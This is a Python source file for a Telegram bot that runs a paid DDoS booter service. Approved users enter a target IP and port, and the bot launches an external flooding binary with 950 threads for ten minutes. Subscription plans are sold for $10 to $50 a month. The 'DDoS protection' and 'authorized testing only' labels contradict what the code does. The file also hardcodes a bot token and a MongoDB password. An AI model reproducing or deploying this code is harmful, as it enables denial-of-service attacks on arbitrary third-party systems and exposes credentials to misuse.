import telebot
import logging
import subprocess
import time
from pymongo import MongoClient
from datetime import datetime, timedelta
import certifi
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import threading
import re

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[
        logging.FileHandler('bot.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Constants
TOKEN = '7232868612:AAEE686letBrsPMdJ28S1QJv51MXY2B5lNc'
MONGO_URI = 'mongodb+srv://zeni:1I8uJt78Abh4K5lo@zeni.v7yls.mongodb.net/?retryWrites=true&w=majority&appName=zeni'
ADMIN_IDS = [8167507955]
OWNER_USERNAME = "seedhe_maut_bot"
BLOCKED_PORTS = [8700, 20000, 443, 17500, 9031, 20002, 20001]
MAX_ATTACK_DURATION = 600  # 10 minutes
THREADS_COUNT = 950
COOLDOWN_DURATION = 300  # 10 minutes cooldown
MAX_CONCURRENT_ATTACKS = 3  # Maximum concurrent attacks per user
MAX_DAILY_ATTACKS = 10  # Maximum attacks per day per user

# Initialize MongoDB
try:
    client = MongoClient(MONGO_URI, tlsCAFile=certifi.where(), serverSelectionTimeoutMS=5000)
    client.server_info()  # Test connection
    db = client['soul']
    users_collection = db.users
    cooldowns_collection = db.cooldowns
    active_attacks_collection = db.active_attacks
    attack_logs_collection = db.attack_logs
except Exception as e:
    logger.error(f"Failed to connect to MongoDB: {e}")
    exit(1)

# Initialize bot
bot = telebot.TeleBot(TOKEN, threaded=True)

# Global variables
user_attack_details = {}
attack_processes = {}  # Track attack processes by user_id
user_attack_counts = {}  # Track daily attack counts

def is_user_admin(user_id):
    return user_id in ADMIN_IDS

def check_user_approval(user_id):
    try:
        user_data = users_collection.find_one({"user_id": user_id})
        if user_data and user_data.get('plan', 0) > 0:
            valid_until = user_data.get('valid_until', "")
            if valid_until == "" or valid_until.lower() == "lifetime":
                return True
            return datetime.now().date() <= datetime.fromisoformat(valid_until).date()
        return False
    except Exception as e:
        logger.error(f"Error checking user approval: {e}")
        return False

def get_user_plan(user_id):
    try:
        user_data = users_collection.find_one({"user_id": user_id})
        return user_data.get('plan', 0) if user_data else 0
    except Exception as e:
        logger.error(f"Error getting user plan: {e}")
        return 0

def check_cooldown(user_id):
    try:
        cooldown = cooldowns_collection.find_one({"user_id": user_id})
        if cooldown:
            remaining = cooldown['ends_at'] - datetime.now()
            if remaining.total_seconds() > 0:
                return remaining.total_seconds()
        return 0
    except Exception as e:
        logger.error(f"Error checking cooldown: {e}")
        return 0

def get_active_attack_count(user_id):
    try:
        return active_attacks_collection.count_documents({"user_id": user_id})
    except Exception as e:
        logger.error(f"Error getting active attack count: {e}")
        return 0

def get_daily_attack_count(user_id):
    try:
        today = datetime.now().replace(hour=0, minute=0, second=0, microsecond=0)
        return attack_logs_collection.count_documents({
            "user_id": user_id,
            "started_at": {"$gte": today}
        })
    except Exception as e:
        logger.error(f"Error getting daily attack count: {e}")
        return 0

def run_attack_command(user_id, target_ip, target_port):
    try:
        # Record the attack start
        attack_id = active_attacks_collection.insert_one({
            "user_id": user_id,
            "target_ip": target_ip,
            "target_port": target_port,
            "started_at": datetime.now(),
            "ends_at": datetime.now() + timedelta(seconds=MAX_ATTACK_DURATION)
        }).inserted_id

        # Log the attack
        attack_logs_collection.insert_one({
            "user_id": user_id,
            "target_ip": target_ip,
            "target_port": target_port,
            "started_at": datetime.now(),
            "duration": MAX_ATTACK_DURATION,
            "threads": THREADS_COUNT
        })

        process = subprocess.Popen(
            ["./maut", target_ip, str(target_port), str(MAX_ATTACK_DURATION), str(THREADS_COUNT)],
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE
        )
        
        # Store the process for potential stopping
        attack_processes[user_id] = process
        logger.info(f"Attack started on {target_ip}:{target_port} with PID {process.pid}")
        
        # Wait for attack to complete or timeout
        try:
            process.wait(timeout=MAX_ATTACK_DURATION)
        except subprocess.TimeoutExpired:
            process.kill()
            logger.info(f"Attack on {target_ip}:{target_port} timed out and was stopped")
        
        # Clean up
        active_attacks_collection.delete_one({"_id": attack_id})
        if user_id in attack_processes:
            attack_processes.pop(user_id)
        
        # Set cooldown
        cooldowns_collection.update_one(
            {"user_id": user_id},
            {"$set": {"ends_at": datetime.now() + timedelta(seconds=COOLDOWN_DURATION)}},
            upsert=True
        )
        
        # Update user stats
        users_collection.update_one(
            {"user_id": user_id},
            {
                "$inc": {"attack_count": 1},
                "$set": {"last_attack": datetime.now().isoformat()}
            },
            upsert=True
        )
        
        return True
    except Exception as e:
        logger.error(f"Error in attack command: {e}")
        if user_id in attack_processes:
            attack_processes.pop(user_id)
        active_attacks_collection.delete_one({"_id": attack_id})
        return False

def stop_user_attack(user_id):
    try:
        stopped = False
        
        # Stop the process if running
        if user_id in attack_processes:
            process = attack_processes[user_id]
            try:
                process.kill()
                stopped = True
            except:
                pass
            attack_processes.pop(user_id, None)
        
        # Remove from active attacks
        result = active_attacks_collection.delete_many({"user_id": user_id})
        if result.deleted_count > 0:
            stopped = True
        
        # Remove attack details
        user_attack_details.pop(user_id, None)
        
        return stopped
    except Exception as e:
        logger.error(f"Error stopping attack: {e}")
        return False

def create_main_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("🚀 Start Attack", callback_data="start_attack"),
        InlineKeyboardButton("⏹ Stop Attack", callback_data="stop_attack"),
        InlineKeyboardButton("ℹ️ Help", callback_data="help"),
        InlineKeyboardButton("📊 My Plan", callback_data="my_plan")
    )
    return markup

def create_admin_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("👥 User Management", callback_data="user_management"),
        InlineKeyboardButton("📊 Stats", callback_data="stats"),
        InlineKeyboardButton("🔙 Main Menu", callback_data="main_menu")
    )
    return markup

def send_welcome_message(chat_id):
    welcome_msg = f"""
🌟 *Welcome to DDoS Protection Bot* 🌟

🔹 *Features:* 
   - Powerful Layer4 DDoS protection
   - Easy-to-use interface
   - Multiple plan options

📌 *Note:* This bot is for authorized testing only. Misuse will result in ban.

Use /help to see available commands.
"""
    bot.send_message(chat_id, welcome_msg, parse_mode='Markdown', reply_markup=create_main_menu())

def send_help_message(chat_id):
    help_msg = f"""
🆘 *Help Center* 🆘

*Available Commands:*
/start - Show main menu
/help - Show this help message
/attack - Start a new attack
/mystats - Show your usage statistics
/buy - Get information about plans

*Admin Commands* (Admin only):
/approve <user_id> <plan> <days> - Approve user
/disapprove <user_id> - Remove user approval
/stats - Show bot statistics

👤 *Owner:* @{OWNER_USERNAME}
"""
    bot.send_message(chat_id, help_msg, parse_mode='Markdown')

def send_plan_info(chat_id, user_id):
    plan = get_user_plan(user_id)
    if plan == 0:
        plan_msg = f"""
📊 *Your Plan: FREE*

🔹 *Limitations:*
- Limited attack duration
- Lower priority
- No support
- Max {MAX_DAILY_ATTACKS} attacks per day

💎 *Upgrade your plan for full features!*

👤 *Contact:* @{OWNER_USERNAME}
"""
    else:
        user_data = users_collection.find_one({"user_id": user_id})
        valid_until = user_data.get('valid_until', "Lifetime")
        plan_msg = f"""
📊 *Your Plan: PREMIUM (Level {plan})*

🔹 *Benefits:*
- Full attack duration
- Highest priority
- Premium support
- Increased daily attack limit

⏳ *Valid Until:* {valid_until}

Thank you for being a premium user!
"""
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("💎 Upgrade Plan", url=f"tg://user?id={ADMIN_IDS[0]}"))
    bot.send_message(chat_id, plan_msg, parse_mode='Markdown', reply_markup=markup)

def show_stats(chat_id):
    try:
        total_users = users_collection.count_documents({})
        premium_users = users_collection.count_documents({"plan": {"$gt": 0}})
        active_attacks_count = active_attacks_collection.count_documents({})
        today = datetime.now().replace(hour=0, minute=0, second=0, microsecond=0)
        today_attacks = attack_logs_collection.count_documents({"started_at": {"$gte": today}})
        
        stats_msg = f"""
📊 *Bot Statistics*

👥 *Total Users:* {total_users}
💎 *Premium Users:* {premium_users}
⚡ *Active Attacks:* {active_attacks_count}
📅 *Today's Attacks:* {today_attacks}
👤 *Owner:* @{OWNER_USERNAME}
"""
        bot.send_message(chat_id, stats_msg, parse_mode='Markdown')
    except Exception as e:
        logger.error(f"Error showing stats: {e}")
        bot.send_message(chat_id, "❌ Failed to retrieve statistics", parse_mode='Markdown')

def safe_edit_message(chat_id, message_id, text, reply_markup=None, parse_mode='Markdown'):
    try:
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text=text,
            reply_markup=reply_markup,
            parse_mode=parse_mode
        )
        return True
    except Exception as e:
        if "message is not modified" not in str(e):
            logger.error(f"Error editing message: {e}")
        return False

def format_time(seconds):
    minutes, seconds = divmod(int(seconds), 60)
    hours, minutes = divmod(minutes, 60)
    if hours > 0:
        return f"{hours}h {minutes}m {seconds}s"
    return f"{minutes}m {seconds}s"

def is_valid_ip(ip):
    pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
    return re.match(pattern, ip) is not None

def is_valid_port(port):
    try:
        port = int(port)
        return 1 <= port <= 65535
    except ValueError:
        return False

# Message handlers
@bot.message_handler(commands=['start'])
def start_command(message):
    try:
        if is_user_admin(message.from_user.id):
            bot.send_message(message.chat.id, "👑 *Admin Panel* 👑", 
                            parse_mode='Markdown', reply_markup=create_admin_menu())
        else:
            send_welcome_message(message.chat.id)
    except Exception as e:
        logger.error(f"Error in start_command: {e}")

@bot.message_handler(commands=['help'])
def help_command(message):
    try:
        send_help_message(message.chat.id)
    except Exception as e:
        logger.error(f"Error in help_command: {e}")

@bot.message_handler(commands=['mystats'])
def mystats_command(message):
    try:
        user_id = message.from_user.id
        user_data = users_collection.find_one({"user_id": user_id}) or {}
        cooldown_remaining = check_cooldown(user_id)
        active_attacks = get_active_attack_count(user_id)
        daily_attacks = get_daily_attack_count(user_id)
        
        stats_msg = f"""
📈 *Your Statistics*

🔸 *Plan Level:* {user_data.get('plan', 0)}
🔸 *Total Attacks:* {user_data.get('attack_count', 0)}
🔸 *Today's Attacks:* {daily_attacks}/{MAX_DAILY_ATTACKS}
🔸 *Active Attacks:* {active_attacks}/{MAX_CONCURRENT_ATTACKS}
🔸 *Cooldown:* {format_time(cooldown_remaining) if cooldown_remaining > 0 else "Ready"}
🔸 *Last Attack:* {user_data.get('last_attack', 'Never')}
🔸 *Account Valid Until:* {user_data.get('valid_until', 'Not specified')}
👤 *Owner:* @{OWNER_USERNAME}
"""
        bot.send_message(message.chat.id, stats_msg, parse_mode='Markdown')
    except Exception as e:
        logger.error(f"Error in mystats_command: {e}")
        bot.send_message(message.chat.id, "❌ Failed to retrieve your statistics", parse_mode='Markdown')

@bot.message_handler(commands=['stats'])
def stats_command(message):
    try:
        if not is_user_admin(message.from_user.id):
            bot.send_message(message.chat.id, "❌ *Access Denied*", parse_mode='Markdown')
            return
        show_stats(message.chat.id)
    except Exception as e:
        logger.error(f"Error in stats_command: {e}")

@bot.message_handler(commands=['buy'])
def buy_command(message):
    try:
        plans_msg = f"""
💎 *Available Plans* 💎

1️⃣ *Basic Plan* ($10/month)
- 10 concurrent attacks
- 5 minute max duration
- Standard support
- Increased daily limit

2️⃣ *Pro Plan* ($25/month)
- 25 concurrent attacks
- 10 minute max duration
- Priority support
- Higher daily limit

3️⃣ *VIP Plan* ($50/month)
- Unlimited attacks
- 30 minute max duration
- 24/7 dedicated support
- No daily limit

📌 *Custom plans available*

👤 *Contact:* @{OWNER_USERNAME} to purchase or for more information.
"""
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("📩 Contact Owner", url=f"tg://user?id={ADMIN_IDS[0]}"))
        bot.send_message(message.chat.id, plans_msg, parse_mode='Markdown', reply_markup=markup)
    except Exception as e:
        logger.error(f"Error in buy_command: {e}")

@bot.message_handler(commands=['attack'])
def attack_command(message):
    try:
        user_id = message.from_user.id
        if not check_user_approval(user_id):
            bot.send_message(message.chat.id, "🔒 You don't have permission to use this feature!")
            return

        # Check daily attack limit
        daily_attacks = get_daily_attack_count(user_id)
        if daily_attacks >= MAX_DAILY_ATTACKS:
            bot.send_message(
                message.chat.id,
                f"⚠️ *Daily attack limit reached* ({daily_attacks}/{MAX_DAILY_ATTACKS})",
                parse_mode='Markdown'
            )
            return

        # Check cooldown
        cooldown_remaining = check_cooldown(user_id)
        if cooldown_remaining > 0:
            bot.send_message(
                message.chat.id,
                f"⏳ *Please wait* - Cooldown active for {format_time(cooldown_remaining)}",
                parse_mode='Markdown'
            )
            return

        # Check concurrent attacks
        active_count = get_active_attack_count(user_id)
        if active_count >= MAX_CONCURRENT_ATTACKS:
            bot.send_message(
                message.chat.id,
                f"⚠️ *Maximum concurrent attacks reached* ({active_count}/{MAX_CONCURRENT_ATTACKS})",
                parse_mode='Markdown'
            )
            return

        msg = bot.send_message(message.chat.id, """
🎯 *Attack Setup*

Please provide the target in this format:
`IP PORT`

Example:
`1.1.1.1 80`
""", parse_mode='Markdown')
        bot.register_next_step_handler(msg, process_attack_ip_port)
    except Exception as e:
        logger.error(f"Error in attack_command: {e}")
        bot.send_message(message.chat.id, "❌ An error occurred while processing your request", parse_mode='Markdown')

# Admin commands
@bot.message_handler(commands=['approve', 'disapprove'])
def admin_commands(message):
    try:
        if not is_user_admin(message.from_user.id):
            bot.send_message(message.chat.id, "❌ *Access Denied*", parse_mode='Markdown')
            return

        command = message.text.split()[0][1:]
        
        if command == 'approve':
            cmd_parts = message.text.split()
            if len(cmd_parts) != 4:
                bot.send_message(message.chat.id, "ℹ️ *Usage:* `/approve <user_id> <plan(1-3)> <days>`", parse_mode='Markdown')
                return

            try:
                target_user_id = int(cmd_parts[1])
                plan = min(max(int(cmd_parts[2]), 1), 3)  # Clamp between 1-3
                days = int(cmd_parts[3])

                valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else "Lifetime"
                users_collection.update_one(
                    {"user_id": target_user_id},
                    {"$set": {
                        "plan": plan,
                        "valid_until": valid_until,
                        "approved_by": message.from_user.id,
                        "approved_at": datetime.now().isoformat()
                    }},
                    upsert=True
                )
                
                response_msg = f"""
✅ *User Approved*
🔹 *ID:* `{target_user_id}`
🔹 *Plan:* {plan}
🔹 *Duration:* {days} days
🔹 *Valid Until:* {valid_until}
"""
                bot.send_message(message.chat.id, response_msg, parse_mode='Markdown')
                
                # Notify the user
                try:
                    bot.send_message(target_user_id, f"""
🎉 *Your account has been approved!*

🔹 *Plan Level:* {plan}
🔹 *Valid Until:* {valid_until}

You can now use all bot features.
""", parse_mode='Markdown')
                except Exception as e:
                    logger.error(f"Could not notify user {target_user_id}: {e}")

            except ValueError:
                bot.send_message(message.chat.id, "❌ Invalid user ID, plan, or days value", parse_mode='Markdown')
            except Exception as e:
                bot.send_message(message.chat.id, f"❌ Error: {str(e)}", parse_mode='Markdown')
                logger.error(f"Error in approve command: {e}")

        elif command == 'disapprove':
            cmd_parts = message.text.split()
            if len(cmd_parts) != 2:
                bot.send_message(message.chat.id, "ℹ️ *Usage:* `/disapprove <user_id>`", parse_mode='Markdown')
                return

            try:
                target_user_id = int(cmd_parts[1])
                users_collection.update_one(
                    {"user_id": target_user_id},
                    {"$set": {
                        "plan": 0, 
                        "valid_until": "", 
                        "disapproved_at": datetime.now().isoformat(),
                        "disapproved_by": message.from_user.id
                    }}
                )
                bot.send_message(message.chat.id, f"❌ *User `{target_user_id}` has been disapproved*", parse_mode='Markdown')
                
                # Notify the user
                try:
                    bot.send_message(target_user_id, """
⚠️ *Your account access has been revoked*

Your plan has been downgraded to Free. 
Contact admin for more information.
""", parse_mode='Markdown')
                except Exception as e:
                    logger.error(f"Could not notify user {target_user_id}: {e}")

            except ValueError:
                bot.send_message(message.chat.id, "❌ Invalid user ID", parse_mode='Markdown')
            except Exception as e:
                bot.send_message(message.chat.id, f"❌ Error: {str(e)}", parse_mode='Markdown')
                logger.error(f"Error in disapprove command: {e}")

    except Exception as e:
        error_msg = f"❌ *Error:* {str(e)}"
        bot.send_message(message.chat.id, error_msg, parse_mode='Markdown')
        logger.error(f"Error in admin_commands: {e}")

# Callback handlers
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    try:
        if call.data == "start_attack":
            user_id = call.from_user.id
            if not check_user_approval(user_id):
                bot.answer_callback_query(call.id, "🔒 You don't have permission to use this feature!", show_alert=True)
                return

            # Check daily attack limit
            daily_attacks = get_daily_attack_count(user_id)
            if daily_attacks >= MAX_DAILY_ATTACKS:
                bot.answer_callback_query(
                    call.id,
                    f"⚠️ Daily attack limit reached ({daily_attacks}/{MAX_DAILY_ATTACKS})",
                    show_alert=True
                )
                return

            # Check cooldown
            cooldown_remaining = check_cooldown(user_id)
            if cooldown_remaining > 0:
                bot.answer_callback_query(
                    call.id,
                    f"⏳ Please wait {format_time(cooldown_remaining)} before next attack",
                    show_alert=True
                )
                return

            # Check concurrent attacks
            active_count = get_active_attack_count(user_id)
            if active_count >= MAX_CONCURRENT_ATTACKS:
                bot.answer_callback_query(
                    call.id,
                    f"⚠️ Maximum concurrent attacks reached ({active_count}/{MAX_CONCURRENT_ATTACKS})",
                    show_alert=True
                )
                return

            msg = bot.send_message(call.message.chat.id, """
🎯 *Attack Setup*

Please provide the target in this format:
`IP PORT`

Example:
`1.1.1.1 80`
""", parse_mode='Markdown')
            bot.register_next_step_handler(msg, process_attack_ip_port)
            bot.answer_callback_query(call.id)
            
        elif call.data == "stop_attack":
            user_id = call.from_user.id
            if stop_user_attack(user_id):
                bot.answer_callback_query(call.id, "✅ All your attacks have been stopped", show_alert=True)
                
                # Edit the original attack message if possible
                try:
                    bot.edit_message_text(
                        chat_id=call.message.chat.id,
                        message_id=call.message.message_id,
                        text="🛑 *Attack Stopped*",
                        parse_mode='Markdown'
                    )
                except:
                    pass
            else:
                bot.answer_callback_query(call.id, "❌ No active attacks found or failed to stop", show_alert=True)
                
        elif call.data == "help":
            send_help_message(call.message.chat.id)
            bot.answer_callback_query(call.id)
            
        elif call.data == "my_plan":
            send_plan_info(call.message.chat.id, call.from_user.id)
            bot.answer_callback_query(call.id)
            
        elif call.data == "user_management":
            if is_user_admin(call.from_user.id):
                markup = InlineKeyboardMarkup()
                markup.add(
                    InlineKeyboardButton("📝 Approve User", callback_data="admin_approve"),
                    InlineKeyboardButton("❌ Disapprove User", callback_data="admin_disapprove"),
                    InlineKeyboardButton("📊 List Users", callback_data="admin_list_users")
                )
                if not safe_edit_message(
                    call.message.chat.id,
                    call.message.message_id,
                    "👥 *User Management*",
                    markup
                ):
                    bot.answer_callback_query(call.id)
            else:
                bot.answer_callback_query(call.id, "❌ Access denied", show_alert=True)
                
        elif call.data == "stats":
            if is_user_admin(call.from_user.id):
                show_stats(call.message.chat.id)
                bot.answer_callback_query(call.id)
            else:
                bot.answer_callback_query(call.id, "❌ Access denied", show_alert=True)
                
        elif call.data == "main_menu":
            if is_user_admin(call.from_user.id):
                if not safe_edit_message(
                    call.message.chat.id,
                    call.message.message_id,
                    "👑 *Admin Panel*",
                    create_admin_menu()
                ):
                    bot.answer_callback_query(call.id)
            else:
                if not safe_edit_message(
                    call.message.chat.id,
                    call.message.message_id,
                    "🌟 *Main Menu*",
                    create_main_menu()
                ):
                    bot.answer_callback_query(call.id)
                
        elif call.data.startswith("confirm_attack_"):
            user_id = int(call.data.split("_")[2])
            if call.from_user.id != user_id:
                bot.answer_callback_query(call.id, "❌ This is not your attack!", show_alert=True)
                return
                
            attack_details = user_attack_details.get(user_id)
            if not attack_details:
                bot.answer_callback_query(call.id, "❌ Attack details not found!", show_alert=True)
                return
                
            target_ip, target_port = attack_details
            
            # Check again in case conditions changed
            cooldown_remaining = check_cooldown(user_id)
            if cooldown_remaining > 0:
                bot.answer_callback_query(
                    call.id,
                    f"⏳ Please wait {format_time(cooldown_remaining)} before next attack",
                    show_alert=True
                )
                return

            # Check daily attack limit
            daily_attacks = get_daily_attack_count(user_id)
            if daily_attacks >= MAX_DAILY_ATTACKS:
                bot.answer_callback_query(
                    call.id,
                    f"⚠️ Daily attack limit reached ({daily_attacks}/{MAX_DAILY_ATTACKS})",
                    show_alert=True
                )
                return

            active_count = get_active_attack_count(user_id)
            if active_count >= MAX_CONCURRENT_ATTACKS:
                bot.answer_callback_query(
                    call.id,
                    f"⚠️ Maximum concurrent attacks reached ({active_count}/{MAX_CONCURRENT_ATTACKS})",
                    show_alert=True
                )
                return

            # Show immediate response
            bot.answer_callback_query(
                call.id,
                "⚡ Attack is being prepared... Please wait",
                show_alert=False
            )
            
            # Edit the message to show attack is starting
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=f"🚀 *Starting attack on {target_ip}:{target_port}...*",
                parse_mode='Markdown'
            )

            # Run attack in a separate thread
            def attack_thread():
                if run_attack_command(user_id, target_ip, target_port):
                    bot.edit_message_text(
                        f"""
✅ *Attack Launched Successfully!*

🔹 *Target:* `{target_ip}:{target_port}`
🔹 *Duration:* `{MAX_ATTACK_DURATION//60} minutes`
🔹 *Threads:* `{THREADS_COUNT}`
🔹 *Cooldown:* `10 minutes`

⚠️ *Attack will automatically stop after {MAX_ATTACK_DURATION//60} minutes*
""",
                        call.message.chat.id,
                        call.message.message_id,
                        parse_mode='Markdown'
                    )
                else:
                    bot.edit_message_text(
                        "❌ *Failed to start attack!*",
                        call.message.chat.id,
                        call.message.message_id,
                        parse_mode='Markdown'
                    )
            
            threading.Thread(target=attack_thread).start()
                
        elif call.data == "cancel_attack":
            bot.delete_message(call.message.chat.id, call.message.message_id)
            bot.answer_callback_query(call.id, "Attack canceled")
            
        elif call.data == "admin_approve":
            if is_user_admin(call.from_user.id):
                bot.send_message(call.message.chat.id, "ℹ️ *Usage:* `/approve <user_id> <plan(1-3)> <days>`", parse_mode='Markdown')
                bot.answer_callback_query(call.id)
            else:
                bot.answer_callback_query(call.id, "❌ Access denied", show_alert=True)
                
        elif call.data == "admin_disapprove":
            if is_user_admin(call.from_user.id):
                bot.send_message(call.message.chat.id, "ℹ️ *Usage:* `/disapprove <user_id>`", parse_mode='Markdown')
                bot.answer_callback_query(call.id)
            else:
                bot.answer_callback_query(call.id, "❌ Access denied", show_alert=True)
                
        elif call.data == "admin_list_users":
            if is_user_admin(call.from_user.id):
                try:
                    premium_users = list(users_collection.find({"plan": {"$gt": 0}}).limit(10))
                    users_list = "\n".join([
                        f"🔹 `{u['user_id']}` - Plan {u['plan']} (Until {u.get('valid_until', '?')})"
                        for u in premium_users
                    ])
                    bot.send_message(
                        call.message.chat.id,
                        f"💎 *Premium Users*\n{users_list}\n\nTotal: {len(premium_users)}",
                        parse_mode='Markdown'
                    )
                    bot.answer_callback_query(call.id)
                except Exception as e:
                    bot.answer_callback_query(call.id, "❌ Failed to retrieve user list", show_alert=True)
                    logger.error(f"Error in admin_list_users: {e}")
            else:
                bot.answer_callback_query(call.id, "❌ Access denied", show_alert=True)
                
    except Exception as e:
        logger.error(f"Error in callback handler: {e}")
        bot.answer_callback_query(call.id, "❌ An error occurred", show_alert=True)

def process_attack_ip_port(message):
    try:
        user_id = message.from_user.id
        args = message.text.split()
        
        if len(args) != 2:
            bot.send_message(message.chat.id, "❌ *Invalid format!* Use: `IP PORT`", parse_mode='Markdown')
            return

        target_ip, target_port_str = args[0], args[1]
        
        # Validate IP
        if not is_valid_ip(target_ip):
            bot.send_message(message.chat.id, "❌ *Invalid IP address format!*", parse_mode='Markdown')
            return
            
        # Validate port
        if not is_valid_port(target_port_str):
            bot.send_message(message.chat.id, "❌ *Invalid port number!* Port must be between 1-65535", parse_mode='Markdown')
            return
            
        target_port = int(target_port_str)
        
        if target_port in BLOCKED_PORTS:
            bot.send_message(message.chat.id, f"🚫 *Port {target_port} is blocked*", parse_mode='Markdown')
            return

        user_attack_details[user_id] = (target_ip, target_port)
        
        # Confirm attack details
        confirm_msg = f"""
🔍 *Attack Details Confirmation*

🔹 *Target IP:* `{target_ip}`
🔹 *Target Port:* `{target_port}`
🔹 *Duration:* `{MAX_ATTACK_DURATION//60} minutes`
🔹 *Threads:* `{THREADS_COUNT}`
🔹 *Cooldown After:* `10 minutes`

⚠️ *Are you sure you want to proceed?*
"""
        markup = InlineKeyboardMarkup()
        markup.add(
            InlineKeyboardButton("✅ Confirm", callback_data=f"confirm_attack_{user_id}"),
            InlineKeyboardButton("❌ Cancel", callback_data="cancel_attack")
        )
        bot.send_message(message.chat.id, confirm_msg, parse_mode='Markdown', reply_markup=markup)

    except Exception as e:
        error_msg = f"❌ *Error:* {str(e)}"
        bot.send_message(message.chat.id, error_msg, parse_mode='Markdown')
        logger.error(f"Error in process_attack_ip_port: {e}")

# Start the bot
if __name__ == "__main__":
    logger.info("Starting bot...")
    while True:
        try:
            bot.polling(none_stop=True, interval=1, timeout=30)
        except Exception as e:
            logger.error(f"Bot crashed: {e}")
            logger.info("Restarting bot in 5 seconds...")
            time.sleep(5)
